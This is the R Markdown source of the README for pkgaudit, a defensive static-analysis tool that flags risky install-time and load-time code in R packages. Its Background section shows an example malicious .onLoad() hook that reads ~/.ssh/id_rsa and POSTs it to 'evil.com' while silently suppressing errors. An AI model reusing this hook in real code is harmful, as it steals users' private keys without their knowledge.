---
output:
  github_document:
    # README.md is the deliverable; the preview would only litter the repo root.
    html_preview: false
---

<!-- README.md is generated from README.Rmd. Please edit that file -->

```{r, include = FALSE}
knitr::opts_chunk$set(
  collapse = TRUE,
  comment  = "#>"
)

# Published SHA-256 of the shipped rules database. Read from the repository copy
# so the value below cannot drift from the database actually committed.
db_path <- file.path("inst", "db", "rules.db")
stopifnot(file.exists(db_path))
db_hash <- digest::digest(db_path, algo = "sha256", file = TRUE)

# Wrap in backticks for inline use. The backtick is built from its code point so
# that it does not terminate the inline expression that emits it.
backtick    <- intToUtf8(96L)
db_hash_md  <- paste0(backtick, db_hash, backtick)
```

# pkgaudit

[![R-CMD-check](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml)
[![coverage](https://raw.githubusercontent.com/tylerjssmith/pkgaudit/badges/coverage.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/coverage.yaml)
[![osv-scanner](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml)

pkgaudit is a static analysis security testing (SAST) tool for R packages. It
scans R source packages for files that can execute arbitrary commands during
autoconf, builds, checks, and installations, and for hooks whose bodies run
automatically when a namespace is loaded, attached, unloaded, or detached. It
scans R source code -- in `R/` and in the examples and `\Sexpr{}` macros of help
files -- for security-relevant patterns like `system()` calls, and shell scripts
and Make-like files for matches like `curl`.

R is scanned wherever a package carries it, not only in `R/`: help-file examples
and `\Sexpr{}` macros, vignettes in R Markdown, Quarto, Sweave and R.rsp,
`data/`, `demo/`, `tests/`, `tools/`, `inst/CITATION`, `.Rprofile`, and
`src/install.libs.R`. Each is reported with the lifecycle phases in which it
runs, so code that executes on `library()` is distinguishable from code that
runs only when someone calls it.

A finding is not an accusation. In many cases, flagged files and code will be
legitimate: files that can execute shell commands are needed for
system-dependent configuration, and many packages call system tools or download
files for good reason. pkgaudit helps you identify which parts of an untrusted 
package should be reviewed before you install and load it.

## Background

R is a statistical programming language widely used in environments processing
sensitive data: clinical trials, government statistics, financial risk
modeling, academic research, and more.

R packages are the primary mechanism for sharing R code. They are also potential
attack vectors. When a user calls `install.packages()`, R downloads and installs
a package and its dependencies. When a user calls `library()` to load and attach
a package, R automatically executes R code contained in `.onLoad()` and
`.onAttach()` hooks. A malicious package anywhere in the dependency graph can
run code on the user's system without any action beyond a normal R workflow.

A minimal example of what a malicious `.onLoad()` hook might look like is:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- paste(
      readLines("~/.ssh/id_rsa"),
      collapse = "\n"
    )
    httr::POST(
      "https://evil.com/evil",
      body = list(key = key)
    )
  }, error = function(e) invisible(NULL))
}
```

This code reads a private cryptographic key and sends it to a server controlled
by the attacker. This occurs whenever a package or dependency containing this
code is loaded, before any package function is called. `tryCatch()` suppresses
any errors, so the user sees nothing unusual even if `readLines()` fails because
the file does not exist or the user lacks permission to read it. pkgaudit flags
this hook as a code context and the `httr::POST()` call as a pattern inside it.

Similar attacks have been documented in ecosystems adjacent to R. In 2022, the
Python package ctx on PyPI was [compromised](https://www.sonatype.com/blog/pypi-package-ctx-compromised-are-you-at-risk)
to exfiltrate environment variables -- including credentials. Later that year, a
malicious `torchtriton` package uploaded to PyPI
[displaced](https://pytorch.org/blog/compromised-nightly-dependency/) the
legitimate dependency of PyTorch's nightly builds and exfiltrated `/etc/passwd`,
`~/.gitconfig`, and the contents of `~/.ssh`.

R's use in environments handling sensitive data makes it an attractive target
for a broad range of threat actors. The assets at risk include both the data
processed in R sessions and the underlying systems on which R runs, which can
provide compute resources and credentials for lateral movement. pkgaudit
provides one layer of defense against an under-appreciated risk, flagging
security-relevant files and code in R packages for manual review.

## Rule Coverage

pkgaudit separates *when* code executes from *what* code does using four rule
categories:

- **File contexts** are the files a scan reads. Their rules are what give
pkgaudit its map of a package: most exist so that a file's *contents* can be
reported -- `R/`, `man/`, vignettes, `tests/`, `data/`, and the rest. A file
context is reported as a finding in its own right only when it both runs
automatically and can only be matched as text rather than parsed. In practice
that is the shell scripts and Make-like files -- `configure`, `src/Makevars`,
`src/Makefile` -- where pkgaudit cannot tell you what the file does, only that
it runs, so the file itself is what needs reading.
- **Code contexts** say when a piece of R code runs. Some are lifecycle hooks
matched by a rule -- `.onLoad()`, `.onAttach()` and friends, whose bodies run
automatically when a namespace is loaded, attached, unloaded, or detached. The
rest are computed from where the code sits: top-level code in a script, a
help-file example, a `\Sexpr{}` macro at a given stage, a vignette chunk, a
test. Every pattern carries the context it was found in, and takes that
context's phases.
- **Patterns** are security-relevant function calls. `system()`, for example,
can execute arbitrary shell commands. `source()` can fetch and execute a remote
payload.
- **Matches** are regular-expression matches in the shell scripts and
Make-like files found as file contexts. `curl` and `wget`, for example, can
fetch a remote payload or send data to a remote host while a package is being
built or installed.

Every file and code context rule declares the lifecycle phases in which it runs
-- `at_autoconf`, `at_build`, `at_check`, `at_install_src`, `at_install_bin`,
`at_load`, `at_attach`, `at_unload`, `at_detach`.

Every pattern finding is attributed to the code context that contains it. A
`system()` call inside an ordinary function only runs if you call that function;
the same call inside `.onLoad()` runs automatically when a namespace is loaded.

Every match is attributed to the file context that contains it, and so carries
that file's phases. Matching text is less precise than matching R's parse tree:
a match in a comment or a quoted string is reported the same as one in a live
command.

The full rule set is documented in
[pkgaudit Rule Coverage](https://tylerjssmith.github.io/pkgaudit/articles/rules.html).

## Installation

You can install pkgaudit as follows:

``` r
remotes::install_github("tylerjssmith/pkgaudit")
```

## Database Integrity

pkgaudit detects security-relevant files and code using a SQLite database of
rules shipped with the package at `inst/db/rules.db`. To verify that your
installed copy of the database has not been modified since publication, check
its SHA-256 hash against the value published here:

``` r
digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
```
Expected SHA-256: `r db_hash_md`

The hash is regenerated automatically by `inst/scripts/build_db.R` whenever the
database is rebuilt and should match the value above exactly. `load_rules()`
verifies the database against its bundled `.sha256` sidecar on every call and
refuses to load a modified database.

## Usage

A source package tarball may be scanned before installation. The example below
scans `untrustedpkg`, a small package shipped with pkgaudit for demonstration:

```{r usage}
library(pkgaudit)

tarball <- system.file(
  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
  package = "pkgaudit"
)

rules  <- load_rules()
result <- audit_tarball(tarball, rules = rules)

print(result, path = FALSE)
```

`summary()` reports how often each R pattern and shell or Make-like match
occurs by phase and code or file context, and the MITRE ATT&CK techniques
involved. Phases can overlap (e.g., building a package with vignettes installs
and loads it), so a finding may be counted under more than one phase.

Below, untrustedpkg has an `.onLoad()` hook with a `system()` call that runs
during builds, checks, installations from source, and loads; an ordinary
function with a `download.file()` call that runs only if a user calls the
enclosing function and so belongs to no phase; and a `configure` script with a
`curl` match that could run during builds, checks, and installations from
source. Code that runs without being asked deserves closer attention.

```{r usage-summary}
summary(result, path = FALSE)
```

Both methods take `path = FALSE`, used above, to omit the local file path from
output that will be shared. The result itself is a named list of data frames
and a list of metadata.

``` r
result$file_contexts  # security-relevant files
result$code_contexts  # lifecycle hooks (.onLoad(), .onAttach())
result$patterns       # security-relevant calls, each with its code_context
                      # and `guarded`, TRUE where the code ships but is not run
result$matches        # regex matches, each with its file_context
result$errors         # any files or rules that could not be processed
result$metadata       # package name/version, SHA-256, rules version, scan time
```

Each of the four findings frames also carries the nine phase columns, so
`subset(result$patterns, at_install_src)` is the set of calls that run on
installation from source.
